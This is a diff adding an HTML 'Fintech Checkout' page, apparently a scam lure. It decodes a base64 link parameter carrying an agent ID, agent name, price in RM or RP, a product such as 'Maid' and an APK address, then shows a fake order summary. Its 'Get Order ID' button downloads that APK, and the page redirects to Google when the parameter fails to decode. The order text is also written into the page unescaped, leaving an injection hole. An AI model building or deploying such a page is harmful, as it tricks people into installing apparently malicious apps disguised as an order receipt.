@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        (function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedP = urlParams.get('p');
+            if (!encodedP) {
+                // window.location.href = 'https://www.google.com';
+                // return;
+            }
+            try {
+                const base64 = encodedP.replace(/-/g, '+').replace(/_/g, '/');
+                const decoded = atob(base64);
+                const p = new URLSearchParams(decoded);
+
+                window._inv = {
+                    company:   p.get('c')   || 'bb',
+                    agent:     p.get('a')   || '9999',
+                    price:     p.get('pr')  || '',
+                    currency:  p.get('cur') || 'RM',
+                    order:     p.get('o')   || '',
+                    product:   p.get('p')   || 'Maid',
+                    agentname: p.get('an')  || 'Italia',
+                    pay:       p.get('w')   || '',
+                    payoption: p.get('po')  || '0',
+                    pin:       p.get('pin') || 'No',
+                    apk:       p.get('apk') || '0'
+                };
+
+                localStorage.setItem('app',      window._inv.company);
+                localStorage.setItem('agent_id', window._inv.agent);
+                localStorage.setItem('price',    window._inv.price);
+                localStorage.setItem('po',       window._inv.payoption);
+                localStorage.setItem('an',       window._inv.agentname);
+                localStorage.setItem('pin',      window._inv.pin);
+                localStorage.setItem('apk',      window._inv.apk);
+            } catch (e) {
+                window.location.href = 'https://www.google.com';
+            }
+        })();
+    </script>
+    <script src="config.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Fintech Checkout</title>
+    <link rel="stylesheet" href="./Step-1_files/bootstrap.min.css">
+    <script src="./Step-1_files/jquery-3.5.1.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&family=Inconsolata:wght@400;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --bg-base: #f8f9fa;
+            --bg-secondary: #ffffff;
+            --bg-tertiary: #f5f6f8;
+            --accent: #2563eb;
+            --accent-secondary: #db2777;
+            --accent-tertiary: #7c3aed;
+            --text-primary: #1a202c;
+            --text-secondary: #64748b;
+            --text-tertiary: #94a3b8;
+            --success: #16a34a;
+            --radius-sm: 12px;
+            --radius-md: 20px;
+            --radius-lg: 28px;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            background: linear-gradient(135deg, var(--bg-base) 0%, #f0f1f5 100%);
+            font-family: 'Sora', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding-bottom: 140px;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(circle at 10% 20%, rgba(37, 99, 235, 0.06) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(219, 39, 119, 0.06) 0%, transparent 40%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .page-content { position: relative; z-index: 1; }
+
+        .container-fluid {
+            padding: 0 1.5rem;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .product-showcase { margin-bottom: 2.5rem; }
+
+        .product-image {
+            width: 92%;
+            height: 220px;
+            max-width: 320px;
+            margin: 0 auto 2rem;
+            border-radius: 24px;
+            object-fit: contain;
+            object-position: center;
+            background: transparent;
+            animation: fadeInScale 0.6s ease-out;
+            display: block;
+        }
+
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.95); }
+            to   { opacity: 1; transform: scale(1); }
+        }
+
+        .panel-floating {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(37, 99, 235, 0.1);
+            border-radius: var(--radius-md);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            animation: slideInUp 0.5s ease-out forwards;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+        }
+
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .panel-floating:nth-child(1) { animation-delay: 0.1s; }
+        .panel-floating:nth-child(2) { animation-delay: 0.2s; }
+        .panel-floating:nth-child(3) { animation-delay: 0.3s; }
+
+        .order-timeline { position: relative; }
+
+        .timeline-item {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .timeline-marker {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: rgba(37, 99, 235, 0.15);
+            border: 2px solid var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            color: var(--accent);
+            flex-shrink: 0;
+            font-weight: 700;
+        }
+
+        .timeline-content { flex: 1; padding-top: 0.2rem; }
+
+        .timeline-label {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .timeline-value {
+            font-size: 1.1rem;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .fee-breakdown { margin-top: 1.5rem; }
+
+        .fee-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            font-size: 0.9rem;
+        }
+
+        .fee-item:last-child { border-bottom: none; }
+        .fee-label { color: var(--text-secondary); }
+
+        .fee-value {
+            color: var(--text-primary);
+            font-weight: 600;
+            font-family: 'Inconsolata', monospace;
+        }
+
+        .fee-value.total {
+            color: var(--accent);
+            font-size: 1.2rem;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            padding: 1.5rem;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid rgba(37, 99, 235, 0.1);
+            z-index: 100;
+            box-shadow: 0 -4px 16px rgba(0, 0, 0, 0.06);
+        }
+
+        .bottom-bar-content {
+            max-width: 480px;
+            margin: 0 auto;
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .amount-display { flex: 1; }
+
+        .amount-label {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 0.3rem;
+        }
+
+        .amount-value {
+            font-size: 1.5rem;
+            color: var(--accent);
+            font-weight: 700;
+            font-family: 'Inconsolata', monospace;
+        }
+
+        .btn-pay {
+            flex: 1;
+            padding: 1rem 1.5rem;
+            background: linear-gradient(135deg, var(--accent) 0%, #00b8d4 100%);
+            color: var(--bg-base);
+            border: none;
+            border-radius: var(--radius-md);
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(0, 217, 255, 0.25);
+            letter-spacing: 0.5px;
+        }
+
+        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0, 217, 255, 0.35); }
+        .btn-pay:active { transform: translateY(0); }
+
+        .notes-section {
+            background: rgba(37, 99, 235, 0.06);
+            border-left: 3px solid var(--accent-secondary);
+            padding: 1.2rem;
+            border-radius: var(--radius-sm);
+            margin-bottom: 2rem;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: var(--text-secondary);
+        }
+
+        .notes-section strong {
+            color: var(--text-primary);
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        @media (max-width: 480px) {
+            body { padding-bottom: 160px; }
+            .container-fluid { padding: 0 1.2rem; }
+            .product-image { width: 90%; height: 200px; max-width: 280px; margin-bottom: 2.5rem; border-radius: 20px; }
+            .panel-floating { padding: 1.2rem; margin-bottom: 1.2rem; }
+            .bottom-bar { padding: 1.2rem; }
+            .btn-pay { padding: 0.95rem 1.2rem; font-size: 0.9rem; }
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(0, 217, 255, 0.2); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(0, 217, 255, 0.4); }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.4s ease-out;
+        }
+
+        .loading-overlay.hidden { opacity: 0; pointer-events: none; }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        a.downloadLink { text-decoration: none; }
+    </style>
+</head>
+
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script src="./Step-1_files/jquery-3.5.1.slim.min.js"></script>
+    <script src="./Step-1_files/popper.min.js"></script>
+    <script src="./Step-1_files/bootstrap.min.js"></script>
+
+    <div class="page-content">
+        <div class="container-fluid">
+            <div class="product-showcase">
+                <img id="productImg" src="" alt="Product" class="product-image">
+            </div>
+
+            <div class="panel-floating">
+                <div class="order-timeline">
+                    <div class="timeline-item">
+                        <div class="timeline-marker">1</div>
+                        <div class="timeline-content">
+                            <div class="timeline-label">Order Details</div>
+                            <div class="timeline-value" id="orderDetails"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel-floating">
+                <div style="margin-bottom: 1rem;">
+                    <div style="font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 0.5rem; font-weight: 600;">Price Breakdown</div>
+                </div>
+                <div class="fee-breakdown">
+                    <div class="fee-item">
+                        <span class="fee-label">Order Subtotal</span>
+                        <span class="fee-value" id="priceSubtotal">RM 0.00</span>
+                    </div>
+                    <div class="fee-item" style="padding: 1rem 0; border-top: 1px solid rgba(255,255,255,0.1); border-bottom: none;">
+                        <span class="fee-label">Total Amount</span>
+                        <span class="fee-value total" id="priceTotal">RM 0.00</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="notes-section">
+                <strong>⏰ Order Deadline</strong>
+                Place your order before 1PM for same-day delivery.
+                <br><br>
+                <strong>📦 Delivery Info</strong>
+                Cannot guarantee specific delivery times. Orders from different vendors will be delivered separately. Redelivery fees apply if unsuccessful.
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="bottom-bar-content">
+            <div class="amount-display">
+                <div class="amount-label">Total</div>
+                <div class="amount-value" id="priceBottom">RM 0.00</div>
+            </div>
+            <a class="downloadLink" href="" download id="downloadBtn">
+                <button class="btn-pay">
+                    <i class="fas fa-file-invoice" style="margin-right: 0.5rem;"></i>Get Order ID
+                </button>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        function formatPrice(val) {
+            const n = parseFloat(val);
+            if (isNaN(n)) return '0.00';
+            return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const inv = window._inv;
+            if (!inv) return;
+
+            document.getElementById('productImg').src = `${API_IMG}logo_${inv.product}.png`;
+            document.getElementById('orderDetails').innerHTML = inv.order.replace(/\n/g, '<br>');
+
+            const currency = (inv.currency === 'RP') ? 'RP' : 'RM';
+            const formatted = currency + ' ' + formatPrice(inv.price);
+            document.getElementById('priceSubtotal').textContent = formatted;
+            document.getElementById('priceTotal').textContent = formatted;
+            document.getElementById('priceBottom').textContent = formatted;
+
+            const ts = Date.now();
+            const apkUrl = inv.apk && inv.apk !== '0' ? `${inv.apk}?_=${ts}` : '#';
+            document.querySelectorAll('.downloadLink').forEach(link => { link.href = apkUrl; });
+
+            setTimeout(function () {
+                document.getElementById('loadingOverlay').classList.add('hidden');
+            }, 2000);
+        });
+    </script>
+</body>
+
+</html>
